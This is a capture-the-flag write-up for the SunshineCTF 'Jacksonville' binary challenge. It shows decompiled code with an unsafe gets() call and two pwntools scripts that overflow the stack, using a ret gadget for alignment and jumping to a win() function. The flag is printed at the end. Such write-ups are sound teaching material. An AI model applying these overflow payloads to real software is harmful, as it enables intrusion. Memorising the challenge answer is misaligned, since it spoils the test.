---
published: false
layout: writeup
title: Jacksonville
source: SunshineCTF
category: i95
date: 2025-09-29
---
I began this challenge by executing the binary to discover that it was pretty simple in just asking for one input:
```bash
What's the best Florida football team?
> Jaguars
WRONG ANSWER!!
```
There was still a lot I didn't understand, so I opened it in ghidra and found the key to the input:
```C
  printf("What\'s the best Florida football team?\n> ");
  gets((char *)&local_68);
  iVar1 = strcmp((char *)((long)&local_68 + 6),"Jaguars");
  if (iVar1 != 0) {
    puts("WRONG ANSWER!!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
```
I need to input 6 characters, then "Jaguars" in order for the routine to exit favorably.
However, obviously, strcmp() compares until \x00, so the "Jaguars" needs to end with 0x00 in order to be able to overflow the buffer:
```bash
What's the best Florida football team?
> aaaaaaJaguarsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
WRONG ANSWER!!
```
My first attempt at overwriting the instruction pointer was unsuccessful as I'd later find out being due to stack alignment issues.
![](Screenshot_2025-09-29_03_37_11.png)
However, now I was glad to rejoice in the success of obtaining rip control and redirecting to the win() function.
My script for the first attempt is as follows:
```python
from pwn import *

p = process("./jacksonville")

buf = b"A" * 6
buf += b"Jaguars\x00"
buf += b"A" * (104 - len(buf))
buf += b"\xf6\x11\x40\x00\x00\x00\x00\x00"

'''
gdb.attach(p, """
                   b *vuln,
                   """)
'''

p.sendline(buf)

p.interactive()
```
Once I figured out the problem was only a stack alignment issue, I just had to add a ret gadget to align the stack to a 16 byte boundary and the exploit was successful.
![](ret_aligns_stack_to_0x10.png)
Here is the script:
```python
from pwn import *

p = process("./jacksonville")
#p = remote("chal.sunshinectf.games", 25602)

buf = b"A" * 6
buf += b"Jaguars\x00"
buf += b"A" * (104 - len(buf))
buf += b"\x1a\x10\x40\x00\x00\x00\x00\x00"
buf += b"\xf6\x11\x40\x00\x00\x00\x00\x00"
buf += b"\xdb\x12\x40\x00\x00\x00\x00\x00"

'''
gdb.attach(p, """
                   b *vuln,
                   """)
'''

p.sendline(buf)

p.interactive()
```
# Flag
```bash
sun{It4chI_b3ats_0b!to_nO_d!ff}
```